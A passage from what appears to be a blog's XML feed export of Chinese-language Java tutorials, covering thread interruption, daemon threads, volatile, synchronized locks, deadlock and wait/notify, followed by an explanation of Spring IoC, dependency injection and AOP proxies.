     <span class="comment">//计算中间代码执行的时间</span></span><br><span class="line">        System.out.println(<span class="string">"elapsedTime="</span> + (System.currentTimeMillis() - startTime));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203104020671.jpg" alt="" /></p><h3 id="使用isinterrupted方法判断中断状态"><a class="markdownIt-Anchor" href="#使用isinterrupted方法判断中断状态"></a> 使用isInterrupted()方法判断中断状态</h3><p>可以在Thread对象上调用isInterrupted()方法来检查任何线程的中断状态。这里需要注意：线程一旦被中断，isInterrupted()方法便会返回true，而一旦sleep()方法抛出异常，它将清空中断标志，此时isInterrupted()方法将返回false。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterruptCheck</span> <span class="keyword">extends</span> <span class="title">Object</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Thread t = Thread.currentThread();</span><br><span class="line">        System.out.println(<span class="string">"Point A: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">        <span class="comment">//待决中断，中断自身</span></span><br><span class="line">        t.interrupt();</span><br><span class="line">        System.out.println(<span class="string">"Point B: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">        System.out.println(<span class="string">"Point C: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            System.out.println(<span class="string">"was NOT interrupted"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>( InterruptedException x)&#123;</span><br><span class="line">            System.out.println(<span class="string">"was interrupted"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//抛出异常后，会清除中断标志，这里会返回false</span></span><br><span class="line">        System.out.println(<span class="string">"Point D: t.isInterrupted()="</span> + t.isInterrupted());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203112444531.jpg" alt="" /></p><h3 id="使用threadinterrupted方法判断中断标志位"><a class="markdownIt-Anchor" href="#使用threadinterrupted方法判断中断标志位"></a> 使用Thread.interrupted()方法判断中断标志位</h3><p>可以使用Thread.interrupted()方法来检查当前线程的中断状态(并隐式重置为false)，由于该方法是静态方法，因此不能在特定的线程下使用，而只能报告调用它的线程的中断状态，如果线程被中断，而且中断状态尚不清楚，那么，这个方法返回true。与isInterrupted()不同，它将自动重置中断状态为false，第二次调用Thread.interrupted()方法，总是返回false，除非中断了线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InterruptReset</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point X: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">        Thread.currentThread().interrupt();</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point Y: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">        System.out.println(</span><br><span class="line">            <span class="string">"Point Z: Thread.interrupted()="</span> + Thread.interrupted());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203142219015.jpg" alt="" /></p><p><strong>补充：</strong></p><ol><li>join()方法用线程对象调用，如果一个线程A中调用另一个线程B的join方法，线程A会等待线程B执行完毕后再执行。</li><li>yield方法直接使用Thread类调用，yield让出CPU执行权限，再重新竞争CPU的执行权，如果没有比它优先级高的线程，则依旧不会有变化。</li></ol><h2 id="线程挂起-恢复与终止的方法"><a class="markdownIt-Anchor" href="#线程挂起-恢复与终止的方法"></a> 线程挂起、恢复与终止的方法</h2><p><a href="http://www.importnew.com/20539.html" target="_blank" rel="noopener">Java并发编程（3）：线程挂起、恢复与终止的正确方法（含代码）</a></p><h2 id="守护线程与线程阻塞"><a class="markdownIt-Anchor" href="#守护线程与线程阻塞"></a> 守护线程与线程阻塞</h2><h3 id="守护线程"><a class="markdownIt-Anchor" href="#守护线程"></a> 守护线程</h3><p><strong>注意：</strong></p><ol><li>setDaemon(true)必须在调用线程的start()方法之前设置，否则会跑出IllegalThreadStateException异常。</li><li>在守护线程中产生的新线程也是守护线程。</li><li>不要认为所有的应用都可以分配给守护线程来进行服务，比如读写操作或者计算逻辑。</li></ol><h3 id="线程阻塞"><a class="markdownIt-Anchor" href="#线程阻塞"></a> 线程阻塞</h3><p><img src="https://upload-images.jianshu.io/upload_images/4470227-ab4c376926c90157.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="线程阻塞的情况" /></p><p><strong>注意：不是所有的阻塞都是可中断的，以上阻塞状态的前两种可中断，后面两张不可以中断。</strong></p><h2 id="volatile变量修饰符"><a class="markdownIt-Anchor" href="#volatile变量修饰符"></a> volatile变量修饰符</h2><p>Java语言规范中指出：为了获得最佳速度，允许线程保存共享成员变量的私有拷贝，而且只当线程进入或者离开同步代码块时才将私有拷贝与共享内存中的原始值进行比较。</p><p>这样当多个线程同时与某个对象交互时，就必须注意到要让线程及时的得到共享成员变量的变化。而volatile关键字就是提示JVM：对于这个成员变量，不能保存它的私有拷贝，而应直接与共享成员变量交互。</p><p>volatile是一种稍弱的同步机制，在访问volatile变量时不会执行加锁操作，也就不会执行线程阻塞，因此volatilei变量是一种比synchronized关键字更轻量级的同步机制。</p><p>使用建议：在两个或者更多的线程需要访问的成员变量上使用volatile。当要访问的变量已在synchronized代码块中，或者为常量时，没必要使用volatile。<br />由于使用volatile屏蔽掉了JVM中必要的代码优化，所以在效率上比较低，因此一定在必要时才使用此关键字。</p><p><a href="http://www.importnew.com/20566.html" target="_blank" rel="noopener">有一个案例分析</a></p><h2 id="runnable和thread实现多线程的区别"><a class="markdownIt-Anchor" href="#runnable和thread实现多线程的区别"></a> Runnable和Thread实现多线程的区别</h2><p>Java实现多线程的方法：继承Thread类、实现Runnable接口、实现Callable接口。在程序开发中，一般用Runnable接口为主，优势如下：<br /><img src="https://upload-images.jianshu.io/upload_images/4470227-c0c19b294153e96c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Runnable的优势.png" /></p><p>以下是两个程序的对比:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticket = <span class="number">5</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ticket = "</span> + ticket--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">        <span class="keyword">new</span> MyThread().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131206094239437.jpg" alt="" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> ticket = <span class="number">5</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ticket = "</span> + ticket--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunnableDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        MyThread my = <span class="keyword">new</span> MyThread();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(my).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131206094642328.jpg" alt="" /></p><p><strong>补充：</strong></p><ol><li>在第二种方法中，输出无法预测，因为ticket-不是原子操作</li><li>在第一种方法中，我们new了3个Thread对象，即三个线程分别执行三个对象中的代码，因此便是三个线程去独立地完成卖票的任务；而在第二种方法中，我们同样也new了3个Thread对象，但只有一个Runnable对象，3个Thread对象共享这个Runnable对象中的代码，因此，便会出现3个线程共同完成卖票任务的结果。如果我们new出3个Runnable对象，作为参数分别传入3个Thread对象中，那么3个线程便会独立执行各自Runnable对象中的代码，即3个线程各自卖5张票。</li><li>在第二种方法中，由于3个Thread对象共同执行一个Runnable对象中的代码，因此可能会造成线程的不安全，比如可能ticket会输出-1（如果我们System.out….语句前加上线程休眠操作，该情况将很有可能出现），这种情况的出现是由于，一个线程在判断ticket为1&gt;0后，还没有来得及减1，另一个线程已经将ticket减1，变为了0，那么接下来之前的线程再将ticket减1，便得到了-1。这就需要加入同步操作（即互斥锁），确保同一时刻只有一个线程在执行每次for循环中的操作。而在第一种方法中，并不需要加入同步操作，因为每个线程执行自己Thread对象中的代码，不存在多个线程共同执行同一个方法的情况。</li></ol><h2 id="使用synchronized获取互斥锁"><a class="markdownIt-Anchor" href="#使用synchronized获取互斥锁"></a> 使用synchronized获取互斥锁</h2><p>在并发编程中，多线程同时并发访问的资源叫做临界资源，当多个线程同时访问对象并要求操作相同资源时，分割了原子操作就有可能出现数据的不一致或数据不完整的情况，为避免这种情况的发生，我们会采取同步机制，以确保在某一时刻，方法内只允许有一个线程。</p><p>采用synchronized修饰符实现的同步机制叫做互斥锁机制，它所获得的锁叫做互斥锁。每个对象都有一个monitor(锁标记)，当线程拥有这个锁标记时才能访问这个资源，没有锁标记便进入锁池。任何一个对象系统都会为其创建一个互斥锁，这个锁是为了分配给线程的，防止打断原子操作。每个对象的锁只能分配给一个线程，因此叫做互斥锁。</p><p>下面是几点说明：</p><ol><li>如果同一个方法内同时有两个或更多线程，则每个线程有自己的局部变量拷贝。</li><li>类的每个实例都有自己的对象级别锁。当一个线程访问实例对象中的synchronized同步代码块或同步方法时，该线程便获取了该实例的对象级别锁，其他线程这时如果要访问synchronized同步代码块或同步方法，便需要阻塞等待，直到前面的线程从同步代码块或方法中退出，释放掉了该对象级别锁。</li><li>访问同一个类的不同实例对象中的同步代码块，不存在阻塞等待获取对象锁的问题，因为它们获取的是各自实例的对象级别锁，相互之间没有影响。</li><li>持有一个对象级别锁不会阻止该线程被交换出来，也不会阻塞其他线程访问同一示例对象中的非synchronized代码。当一个线程A持有一个对象级别锁（即进入了synchronized修饰的代码块或方法中）时，线程也有可能被交换出去，此时线程B有可能获取执行该对象中代码的时间，但它只能执行非同步代码（没有用synchronized修饰），当执行到同步代码时，便会被阻塞，此时可能线程规划器又让A线程运行，A线程继续持有对象级别锁，当A线程退出同步代码时（即释放了对象级别锁），如果B线程此时再运行，便会获得该对象级别锁，从而执行synchronized中的代码。</li><li>持有对象级别锁的线程会让其他线程阻塞在所有的synchronized代码外。例如，在一个类中有三个synchronized方法a，b，c，当线程A正在执行一个实例对象M中的方法a时，它便获得了该对象级别锁，那么其他的线程在执行同一实例对象（即对象M）中的代码时，便会在所有的synchronized方法处阻塞，即在方法a，b，c处都要被阻塞，等线程A释放掉对象级别锁时，其他的线程才可以去执行方法a，b或者c中的代码，从而获得该对象级别锁。</li><li>使用synchronized（obj）同步语句块，可以获取指定对象上的对象级别锁。obj为对象的引用，如果获取了obj对象上的对象级别锁，在并发访问obj对象时时，便会在其synchronized代码处阻塞等待，直到获取到该obj对象的对象级别锁。当obj为this时，便是获取当前对象的对象级别锁。</li><li>类级别锁被特定类的所有示例共享，它用于控制对static成员变量以及static方法的并发访问。具体用法与对象级别锁相似。</li><li>互斥是实现同步的一种手段，临界区、互斥量和信号量都是主要的互斥实现方式。synchronized关键字经过编译后，会在同步块的前后分别形成monitorenter和monitorexit这两个字节码指令。根据虚拟机规范的要求，在执行monitorenter指令时，首先要尝试获取对象的锁，如果获得了锁，把锁的计数器加1，相应地，在执行monitorexit指令时会将锁计数器减1，当计数器为0时，锁便被释放了。由于synchronized同步块对同一个线程是可重入的，因此一个线程可以多次获得同一个对象的互斥锁，同样，要释放相应次数的该互斥锁，才能最终释放掉该锁。</li></ol><h2 id="多线程环境下安全使用集合api"><a class="markdownIt-Anchor" href="#多线程环境下安全使用集合api"></a> 多线程环境下安全使用集合API</h2><p><a href="http://www.importnew.com/20624.html" target="_blank" rel="noopener">Java并发编程（8）：多线程环境中安全使用集合API（含代码）</a></p><h2 id="死锁"><a class="markdownIt-Anchor" href="#死锁"></a> 死锁</h2><p>线程A当前持有互斥所锁lock1，线程B当前持有互斥锁lock2。接下来，当线程A仍然持有lock1时，它试图获取lock2，因为线程B正持有lock2，因此线程A会阻塞等待线程B对lock2的释放。如果此时线程B在持有lock2的时候，也在试图获取lock1，因为线程A正持有lock1，因此线程B会阻塞等待A对lock1的释放。二者都在等待对方所持有锁的释放，而二者却又都没释放自己所持有的锁，这时二者便会一直阻塞下去。这种情形称为死锁。</p><p>下面介绍避免死锁的几种常见方法：</p><ol><li>避免一个线程获取多个锁</li><li>避免一个线程在锁内同时占用多个资源，尽量保证每个锁只占用一个资源</li><li>尝试使用定时锁，使用lock.tryLock(timeout)来代替使用内部锁机制</li><li>对于数据库锁，加锁和解锁必须在一个数据库连接里，否则会出现解锁失败的情况</li></ol><h2 id="使用waitnotifynotifyall实现线程间通信"><a class="markdownIt-Anchor" href="#使用waitnotifynotifyall实现线程间通信"></a> 使用wait/notify/notifyAll实现线程间通信</h2><p>在Java中，可以通过配合调用Object对象的wait()方法和notify()方法或notifyAll()方法来实现线程间的通信。在线程中调用wait()方法，将阻塞等待其他线程的通知（其他线程调用notify()方法或notifyAll()方法），在线程中调用notify()方法或notifyAll()方法，将通知其他线程从wait()方法处返回。</p><p>Object是所有类的超类，它有5个方法组成了等待/通知机制的核心：notify()、notifyAll()、wait()、wait(long)和wait(long, int)。在Java中，所有的类都从Object继承而来，因此，所有的类都拥有这些共有方法可供使用。而且，由于他们都被声明为final，因此在子类中不能覆写任何一个方法。</p><p><strong>注意：</strong></p><ol><li>如果线程调用了对象的wait()方法，那么线程便会处于该对象的等待池中，等待池中的线程不会去竞争该对象的锁。</li><li>当有线程调用了对象的notifyAll()方法（唤醒所有wait线程）或notify()方法（只随机唤醒一个wait线程），被唤醒的的线程便会进入该对象的锁池中，锁池中的线程会去竞争该对象锁。</li><li>优先级高的线程竞争到对象锁的概率大，假若某线程没有竞争到该对象锁，它还会留在锁池中，唯有线程再次调用wait()方法，它才会重新回到等待池中。而竞争到对象锁的线程则继续往下执行，直到执行完了synchronized代码块，它会释放掉该对象锁，这时锁池中的线程会继续竞争该对象锁。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 并发编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 并发编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring的IOC与AOP特性</title>
      <link href="/ioc-and-aop/"/>
      <url>/ioc-and-aop/</url>
      
        <content type="html"><![CDATA[<h2 id="spring的ioc特性"><a class="markdownIt-Anchor" href="#spring的ioc特性"></a> Spring的IOC特性</h2><h3 id="什么是控制反转"><a class="markdownIt-Anchor" href="#什么是控制反转"></a> 什么是控制反转</h3><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-a8f81355f8c40277.jpg" alt="图1. 控制反转" /></p><p>见图1，软件中的对象就如同图中的齿轮，协同工作，互相耦合，若是一个零件不能正常工作，则会导致整个系统的奔溃，这就是强耦合系统。为了解决对象间耦合度过高的问题，软件专家Michael Mattson提出了IoC理论。</p><p>控制反转(Inversion of Control)是一种面向对象编程中的一种设计原则，用来解决计算机代码之间的耦合度。其基本思想是：借助于&quot;第三方&quot;实现具有依赖关系的对象之间的耦合。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-581580a9c05886ea.jpg" alt="图2. IoC" /></p><p>见图2，由于引进了IoC容器，使得A、B、C、D这四个对象没有了耦合关系，对象的控制权全部由IoC容器负责。</p><p>我们再次来对比一下：</p><ol><li>软件系统在没有引入IoC容器之前，如图1，对象A依赖与对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上。</li><li>软件系统在引入IoC容器之后，就完全不同了。如图2，由于IoC容器的加入，对象A与对象B之间失去了直接联系，所以，当对象A运行到需要B的对象，IoC容器会主动创建一个对象B注入到对象A需要的地方。</li></ol><p>通过对比，可以看出对象A依赖对象B的过程，由主动行为变成了被动行为，控制权颠倒了过来，这就是&quot;控制反转&quot;的由来。</p><h3 id="什么是依赖注入"><a class="markdownIt-Anchor" href="#什么是依赖注入"></a> 什么是依赖注入</h3><p>当A对象需要调用B对象方法时，这种情况在Spring中称为依赖，即A对象依赖B对象，Spring把互相调用的关系称为依赖关系。</p><p>在传统模式下当需要调用其他对象的方法时，一般有以下两种方式：</p><ul><li>原始做法：调用者主动创建被依赖对象，然后再调用被依赖对象的方法。</li><li>简单工厂模式：调用者先找到被依赖对象的工厂，然后主动通过工厂去获取被依赖对象，最后再调用被依赖对象的方法。</li></ul><p>对于第一种方式，由于调用者需要通过形如&quot;new 被依赖对象构造器();&quot;的代码来创建对象，这种方式会导致调用者与被依赖对象实现类的硬编码耦合，不利于项目升级维护。</p><p>对于第二种方式，要把握一下三点：</p><ul><li>调用者面向被依赖对象的接口编程</li><li>将被依赖对象的创建交给工厂完成</li><li>调用者通过工厂来获得被依赖组件</li></ul><p>这样，调用者只需与被依赖对象的接口耦合，这样就避免了类层次的硬编码耦合。缺点是，调用组件需要主动通过工厂去获取被依赖对象，这就会带来调用组件与被依赖对象的耦合。</p><p>当使用Spring容器后，程序无须使用new调用构造器去创建对象，所有的Java对象都可交给Spring容器去创建；当调用者需要被依赖对象的方法时，调用者无须主动获取被依赖对象，只需要等待Spring容器注入即可。</p><h3 id="控制反转与依赖注入的关系"><a class="markdownIt-Anchor" href="#控制反转与依赖注入的关系"></a> 控制反转与依赖注入的关系</h3><ul><li>控制反转是一种思想</li><li>依赖注入是一种设计模式</li></ul><p>IoC框架使用依赖注入作为实现控制反转的方式，但是控制反转还有其他的实现方式，例如说ServiceLocator，所以不能将控制反转和依赖注入等同。</p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h3><hr /><ul><li><a href="http://blog.xiaohansong.com/2015/10/21/IoC-and-DI/" target="_blank" rel="noopener">《控制反转（IoC）与依赖注入（DI）》</a></li><li>《轻量级JavaEE企业应用实战》（第4版）李刚 编著</li></ul><h2 id="spring的aop特性"><a class="markdownIt-Anchor" href="#spring的aop特性"></a> Spring的AOP特性</h2><p><em>以下内容来自于博客<a href="https://www.ibm.com/developerworks/cn/java/j-lo-springaopcglib/index.html" target="_blank" rel="noopener">Spring AOP 实现原理与 CGLIB 应用</a></em></p><p>AOP（Aspect Orient Programming）,作为面向对象编程的一种补充，广泛应用于处理一些具有横切性质的系统级服务，如事务管理、安全检查、缓存、对象池管理等。AOP实现的关键就在于AOP框架自动创建的AOP代理，AOP代理则可分为静态代理和动态代理两大类，其中静态代理是指AOP框架提供的命令进行编译，从而在编译阶段就可生成AOP代理类，因此也被称为编译时增强；而动态代理则是在运行时借助于JDK动态代理、CGLIB等在内存中“临时”生成AOP动态代理类，因此也被称为运行时增强。</p><h3 id="aop的存在价值"><a class="markdownIt-Anchor" href="#aop的存在价值"></a> AOP的存在价值</h3><p>在传统的OOP编程里以对象为核心，整个软件系统由一系列相互依赖的对象组成，而这些对象将被抽象成一个个类，并允许使用类继承来管理类与类之间一般到特殊的关系。随着软件规模的增大，应用的逐渐升级，慢慢出现了一些OOP很难解决的问题。</p><p>我们可以通过分析、抽象出一系列具有一定属性与行为的对象，并通过这些对象的协作来形成一个完整的软件功能。由于对象可以继承，因此我们可以把具有相同功能或相同特性的属性抽象到一个层次分明的类结构体系中。随着软件规范的不断扩大，专业化分工越来越系列，以及OOP应用实践的不断增多，随之也暴露出了一些OOP无法很好解决的问题。</p><p>现在假设系统中有3段完全相似的代码，这些代码通常会采用“复制”、“粘贴”方式来完成，通过这种“复制”、“粘贴”方式开发出来的软件如图3所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-508a18311f425fbf.jpg" alt="图3. 多个地方包含相同代码的软件" /></p><p>看到如图3所示的示意图，可以看到了这种设计的不足之处。当有一天，图1中的深色代码段需要修改，那是不是要打开3个地方的代码进行修改？如果不是3个地方包含这段代码，而是100个地方，甚至是1000个地方包含这段代码段，那会是什么后果？</p><p>为了解决这个问题，我们通常会采用将如图3所示的深色代码部分定义成一个方法，然后在3个代码段中分别调用该方法即可。在这种方式下，软件系统的结构如图4所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-b6306a904bb675ae.jpg" alt="图4. 通过方法调用实现系统功能" /></p><p>对于如图4所示的软件系统，如果需要修改深色部分的代码，只要修改一个地方即可，不管整个系统中有多少方法调用了该方法，程序无须修改这些地方，只需要修改被调用的方法即可——通过这种方式，大大降低了软件后期维护的复杂度。</p><p>对于如图4所示的方法1、方法2、方法3依然需要显式调用深色方法，这样做能够解决大部分应用场景。但对于一些更特殊的情况：应用需要方法1、方法2、方法3彻底与深色方法分离——方法1、方法2、方法3无须直接调用深色方法，该如何解决？</p><p>因为软件系统需求变更是非常频繁的事情，系统前期设计方法1、方法2、方法3时只实现了核心业务功能，过了一段时间，我们需要为方法1、方法2、方法3都增加事务控制；又过了一段时间，客户提出方法1、方法2、方法3需要进行用户合法性验证。只有合法的用户才能执行这些方法。因此，我们希望有一种特殊的方法：我们只要定义该方法，无须在方法1、方法2、方法3中显式调用它，系统会“自动”执行该特殊方法。</p><p>实现上述需求的技术就是AOP。AOP专门用于处理系统中分布于各个模块（不同方法）中交叉关注点的问题，在JavaEE应用中，常常通过AOP来处理一些具有横切性质的系统级服务，如事务管理、安全检查、缓存、对象池管理等，AOP已经成为一种非常常用的解决方案。</p><h3 id="spring-aop原理剖析"><a class="markdownIt-Anchor" href="#spring-aop原理剖析"></a> Spring AOP原理剖析</h3><p>Spring AOP框架对AOP代理类的处理原则是：如果目标对象的实现类实现了接口，Spring AOP将会采用JDK动态代理来生成AOP代理类；如果目标对象的实现类没有实现接口，Spring AOP将会采用CGLIB来生成AOP代理类——不过这个选择过程对开发者完全透明、开发者无须关心。</p><p>AOP代理其实是由AOP框架动态生成的一个对象，该对象可作为目标对象使用。AOP代理包含了目标对象的全部方法，但AOP代理中的方法与目标对象的方法存在差异：AOP方法在特定切入点添加了增强处理，并回调了目标对象的方法。</p><p>AOP代理所包含的方法与目标对象的方法示意图如图5所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-33be778218ec316b.gif" alt="图5. AOP代理的方法与目标对象的方法" /></p><p>Spring的AOP代理有Spring的IoC容器负责生成、管理，其依赖关系也有IoC容器负责管理。因此，AOP代理可以直接使用容器中的其他Bean实例作为目标，这种关系可由IoC容器的依赖注入提供。</p><p>纵观AOP编程，其中需要程序员参与的只有3个部分：</p><ul><li>定义普通业务组件</li><li>定义切入点，一个切入点可能横切多个业务组件</li><li>定义增强处理，增强处理就是在AOP框架为普通业务组件织入的处理动作</li></ul><p>上面3个部分的第一个部分是最平常不过的事情，无须额外说明。那么进行AOP编程的关键就是定义切入点和定义增强处理。一但定义了合适的切入点和增强处理，AOP框架将会自动生成AOP代理，而AOP代理的方法大致有如下公式：</p><p><strong>代理对象的方法 = 增强处理 + 被代理对象的方法</strong></p><p>Spring AOP的实现原理：AOP框架负责动态生成AOP代理类，这个代理类的方法则由Advice和回调方法对象的方法所组成。</p><p>对于前面提到的图4所示的软件调用结构：当方法1、方法2、方法3…都需要去调用某个具有“横切”性质的方法时，传统的做法是程序员去手动修改方法1、方法2、方法3…通过代码来调用这个具有“横切”性质的方法，但这种做法的可扩展性不好，因为每次都要修改代码。</p><p>于是AOP框架出现，AOP框架则可以“动态的”生成一个新的代理类，而这个代理类所包含的方法1、方法2、方法3的代码，程序员只要定义切入点即可——AOP框架所生成的AOP代理类中包含了新的方法1、方法2、方法3，而AOP框架会根据切入点来决定是否要在方法1、方法2、方法3中回调具有“横切”性质的方法。</p><p>简而言之：AOP原理的奥妙就在于动态地生成了代理类，这个代理类实现了图2的调用——这种调用无须程序员修改代码。</p><h3 id="参考资料-2"><a class="markdownIt-Anchor" href="#参考资料-2"></a> 参考资料</h3><ul><li>《轻量级JavaEE企业应用实战》（第4版）李刚 编著</li><li>《疯狂Java讲义》李刚 编著</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMap实现原理</title>
      <link href="/hashMap/"/>
      <url>/hashMap/</url>
      
